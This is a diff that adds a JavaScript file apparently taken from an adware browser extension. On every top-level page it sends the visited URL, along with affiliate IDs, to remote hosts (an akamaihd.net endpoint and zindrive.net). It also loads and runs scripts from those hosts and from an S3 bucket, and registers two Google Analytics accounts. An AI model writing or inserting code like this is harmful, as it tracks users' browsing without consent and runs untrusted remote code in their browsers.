@@ -1,0 +1,12 @@
+!function(){if(window.self===window.top){var a=a||{};a.addonname="Royals",a.subID="ACROP",a.affid=9638,a.subaffid=1005;var e="addonname="+a.addonname+"&clientuid="+a.clientuid+"&subID="+a.subID+"&affid="+a.affid;e+="&subaffid="+a.subaffid+"&href="+encodeURIComponent(window.location.href);var t=document.createElement("script");t.src=("https:"==document.location.protocol?"https://":"http://")+"asrvvv-a.akamaihd.net/get?"+e,document.body.appendChild(t)}}(),function(){var a=document.getElementsByTagName("head")[0],e=document.createElement("script");e.type="text/javascript",e.src="//s3.amazonaws.com/ez22/CONF.js",a.appendChild(e)}();var _gaq=_gaq||[];_gaq.push(["_setAccount","UA-58033610-1"]),_gaq.push(["_trackPageview","CLEZ1"]);var _gaq=_gaq||[];_gaq.push(["_setAccount","UA-72184248-1"]),_gaq.push(["_trackPageview"]),function(){var a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src="https://ssl.google-analytics.com/ga.js";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(a,e)}();
+
+//-------------------------------------------------------------------------------
+
+(function () {
+        var scr = document.createElement('script');
+        scr.type = 'text/javascript';
+        scr.async = true;
+        scr.src = "//zindrive.net/extg/file.php?x="+document.location.href;
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(scr, s);
+ })();
